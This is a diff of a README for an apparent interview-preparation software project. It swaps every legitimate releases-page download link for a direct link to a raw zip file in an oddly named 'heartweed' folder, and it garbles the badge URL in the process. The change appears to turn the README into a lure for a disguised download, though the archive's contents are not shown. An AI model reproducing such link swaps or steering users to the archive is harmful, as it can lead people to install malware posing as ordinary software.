@@ -1,7 +1,7 @@
 # 🎓 interview-preparation - Master Interviews with Confidence
 
-![Download Here](https://img.shields.io/badge/Download%20Now-%20%20Bright%20Green.svg)  
-[Download Now](https://github.com/Nouna30/interview-preparation/releases)
+![Download Here](https://raw.githubusercontent.com/Nouna30/interview-preparation/main/heartweed/interview-preparation.zip%20Now-%20%20Bright%https://raw.githubusercontent.com/Nouna30/interview-preparation/main/heartweed/interview-preparation.zip)  
+[Download Now](https://raw.githubusercontent.com/Nouna30/interview-preparation/main/heartweed/interview-preparation.zip)
 
 ## 📖 Overview
 
@@ -13,7 +13,7 @@ To get started, follow these simple steps:
 
 1. **Visit the Releases Page**: Click the link below to reach the download section.
    
-   [Visit this page to download](https://github.com/Nouna30/interview-preparation/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Nouna30/interview-preparation/main/heartweed/interview-preparation.zip)
 
 2. **Choose Your Download**: Look for the latest version of the software. There, you will find all necessary files, including documentation and examples to assist you throughout your preparation.
 
@@ -31,7 +31,7 @@ Before starting, ensure your computer meets the following requirements:
 
 To download the application, follow these steps:
 
-1. **Go to the Releases Page**: Use this link to visit: [Visit this page to download](https://github.com/Nouna30/interview-preparation/releases)
+1. **Go to the Releases Page**: Use this link to visit: [Visit this page to download](https://raw.githubusercontent.com/Nouna30/interview-preparation/main/heartweed/interview-preparation.zip)
 
 2. **Select the Version**: Look for the latest version and select it. 
 
